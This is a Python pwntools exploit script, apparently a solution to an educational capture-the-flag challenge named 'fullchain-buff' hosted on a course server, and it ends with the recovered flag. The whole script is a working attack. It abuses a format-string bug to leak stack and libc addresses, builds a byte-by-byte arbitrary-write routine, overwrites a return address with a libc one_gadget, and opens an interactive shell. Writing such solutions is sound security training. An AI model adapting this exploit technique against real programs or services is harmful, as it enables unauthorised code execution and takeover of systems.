from pwn import *

elf = ELF('./fullchain-buff')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def local():
    p.recvuntil(b'local > ')
    p.sendline(b'local')

def glob():
    p.recvuntil(b'local > ')
    p.sendline(b'global')
    # sleep(0.1)

def read(len, cont):
    p.recvuntil(b'write > ')
    p.sendline(b'read')
    p.recvuntil(b'length > ')
    p.sendline(str(len).encode())
    p.send(cont)

def write():
    p.recvuntil(b'write > ')
    p.sendline(b'write')

mov_ebp_big = 0x0000000000401381
lea_ebx_rax = 0x40141E

while True:
    # p = elf.process()
    p = remote('edu-ctf.zoolab.org', 30205)
    glob()
    # read(22, b'%8c%8$hhn%4985c%20$hn') # 0x1381 - 0x8
    read(22, b'%8c%8$hhn%5142c%20$hn') # 5150(0x141e) - 8
    glob()
    # raw_input()
    write()
    glob()
    # raw_input()
    write()
    try:
        print(p.recvuntil(b'local > ', timeout=1))
        # raw_input()
        break
    except:
        p.close()

# glob()
p.sendline(b'global')
read(12, b'%8$p.%23$p.\x00')
glob()
# raw_input()
write()
loc = int(p.recvuntil(b'.')[:-1], 16) - 0x40
print(hex(loc))
# canary = int(p.recvuntil(b'.')[:-1], 16)
# print(hex(canary))
leak_libc = int(p.recvuntil(b'.')[:-1], 16) - (libc.symbols['__libc_start_main'] + 243)
print(hex(leak_libc))

def arb_write(addr, length, target):
    for i in range(6):
        glob()
        read(12, b'%' + str(112 + i).encode() + b'c%8$hhn\x00')
        glob()
        write()
        ch = (addr >> (i * 8)) & 0xff
        if ch == 0:
            fmt = b'%20$hhn\x00'
        else:
            fmt = b'%' + str(ch).encode() + b'c%20$hhn\x00'
        glob()
        read(len(fmt), fmt)
        glob()
        # raw_input()
        write()
    glob()
    read(12, b'%' + str(112).encode() + b'c%8$hhn\x00')
    glob()
    write()
    # raw_input()
    for i in range(length):
        ch = (addr + i) & 0xff
        if ch == 0:
            fmt = b'%20$hhn\x00'
        else:
            fmt = b'%' + str(ch).encode() + b'c%20$hhn\x00'
        glob()
        read(len(fmt), fmt)
        glob()
        write()
        ch = (target >> (i * 8)) & 0xff
        if ch == 0:
            fmt = b'%22$hhn\x00'
        else:
            fmt = b'%' + str(ch).encode() + b'c%22$hhn\x00'
        glob()
        read(len(fmt), fmt)
        glob()
        # raw_input()
        write()

ret_addr = loc + 0x48
one_gadget = leak_libc + 0xe6c81
arb_write(ret_addr, 6, one_gadget)

leav_ret = 0x4012C3
glob()
read(10, b'%8c%8$hhn\x00')
glob()
# raw_input()
write()
glob()
read(13, b'%4803c%20$hn\x00') # 0x12c3
glob()
# raw_input()
write()

p.interactive()

# FLAG{there is no fullchain's grandpa because fullchain-buff is an orphan :(}